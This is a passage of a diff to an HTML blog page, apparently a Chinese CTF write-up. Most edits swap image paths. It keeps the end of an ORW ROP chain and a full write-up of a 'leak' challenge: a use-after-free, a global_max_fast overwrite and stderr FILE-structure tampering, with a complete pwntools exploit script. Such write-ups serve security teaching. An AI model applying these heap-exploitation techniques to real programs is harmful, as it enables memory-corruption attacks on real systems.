class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">pause()</span><br><span class="line">p.send(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -354,19 +357,19 @@
 
 
 
-<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="../img/image-20221031162148626.png" alt="image-20221031162148626" style="zoom:50%;" />
+<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037951.png" alt="image-20221031162148626" style="zoom:50%;" />
 
-<img src="../img/image-20221031162709412.png" alt="image-20221031162709412" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037952.png" alt="image-20221031162709412" style="zoom:50%;" />
 
 <p>emmm这个沙箱，感觉开了和没开一样。</p>
 <h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>在delete函数里存在UAF漏洞(如下)</p>
-<img src="../img/image-20221031171824181.png" alt="image-20221031171824181" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037953.png" alt="image-20221031171824181" style="zoom:50%;" />
 
 <p>然后这道题没有show函数，而且没有puts等io输出函数，程序的所有输出都是自己用write函数来封装的，因此我们无法在这道题打IO leak泄露libc地址。</p>
 <p>发现这道题其实已经将flag读到了一个堆块里(如下)</p>
-<p><img src="/../img/image-20221031172450922.png" alt="image-20221031172450922"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037954.png" alt="image-20221031172450922"></p>
 <p>另外值得一提的就是在add函数里申请堆块的时候，最大可以申请到0x60000的堆块。</p>
-<p><img src="/../img/image-20221031172603962.png" alt="image-20221031172603962"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037955.png" alt="image-20221031172603962"></p>
 <h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>因为这道题已经将flag读到堆块里了，所以我们应该考虑如何输出堆块里的数据。在exit退出的时候，会刷新IO_list_all链表上的所有文件流，而在刷新的时候_IO_2_1_stderr结构体中的_IO_write_base字段与_IO_write_ptr字段之间如果存在数据的话，就会将其输出出来，如果我们能让这两个字段之间包含了存flag的那个堆块，在程序退出的时候就可以打印出来flag了。</p>
 <h4 id="篡改global-max-fast"><a href="#篡改global-max-fast" class="headerlink" title="篡改global_max_fast"></a>篡改global_max_fast</h4><p>这样的话我们需要向stderr结构体里写入两个堆地址，于是思路是我们将global_max_fast改为一个大数，导致fastbinsY数组的溢出，计算好目标地址和fastbin数组之间的偏移，申请一个对应size的堆块，就可以让堆地址写入到目标地址了。</p>
 <p>这里简单叙述下讲堆地址写入目标地址的原理:</p>
@@ -386,7 +389,7 @@
 <p>我们利用uaf+edit篡改chunk2的fd指针的低字节，将本来的chunk3改成chunk4<br>于是tcache bin 0x90:chunk2-&gt;chunk4-&gt;main_arena+96<br>再编辑chunk4，去修改main_arena+96的低字节，将其改为global_max_fast，最后即可申请出来global_max_fast</p>
 </blockquote>
 <p>而申请出来stderr的方法同上，我是将unsorted bin的fd改成了global_max_fast bk改为了stderr结构体(如下)</p>
-<p><img src="/../img/image-20221031183209848.png" alt="image-20221031183209848"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037956.png" alt="image-20221031183209848"></p>
 <p><strong>注意:由于这样申请出来会破坏unsorted bin，所以在破坏之前，我们需要把之后用到的所有堆块先全部申请出来</strong></p>
 <p>把上面两个地址申请出来后，最后释放掉size为0x14b0和0x14c0的两个堆块，即可将两个堆地址写入stderr结构体中(情况如下)</p>
 <img src="../img/image-20221031183654159.png" alt="image-20221031183654159" style="zoom:50%;" />
@@ -396,7 +399,7 @@
 <p>因为之前我们将stderr结构体申请出来了，此时自然可以编辑它，将base字段的末尾改到装有flag的堆块低地址处，最后执行exit函数即可获取flag(不过最终脚本需要爆破，概率为1&#x2F;256)</p>
 <h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xb0</span>)<span class="comment">#chunk9</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)<span class="comment">#chunk0</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x410</span>)<span class="comment">#chunk1</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x70</span>)<span class="comment">#chunk2</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x70</span>)<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xb0</span>)<span class="comment">#chunk7</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0x410</span>)<span class="comment">#chunk10</span></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0x14b0</span>)</span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0x14c0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xb0</span>)<span class="comment">#chunk8</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#chunk2-&gt;chunk0-&gt;chunk3</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#chunk8-&gt;chunk7-&gt;chunk9</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">&#x27;\xe0&#x27;</span>)<span class="comment">#unsorted bin chunk get into tcache bin</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x40\xf9&#x27;</span>)<span class="comment">#tamper main_arena+96 to global max fast</span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x80\xe6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">0x7fff</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xb0</span>)<span class="comment">#stderr</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x23E3</span>,<span class="number">0x23EF</span>,<span class="number">0x2297</span>,<span class="number">0x23FB</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x90&#x27;</span></span><br><span class="line">    edit(<span class="number">13</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------&gt;&#x27;</span>+<span class="built_in">str</span>(cnt))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/image-20221031183954894.png" alt="image-20221031183954894"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037957.png" alt="image-20221031183954894"></p>
 
     </div>
 
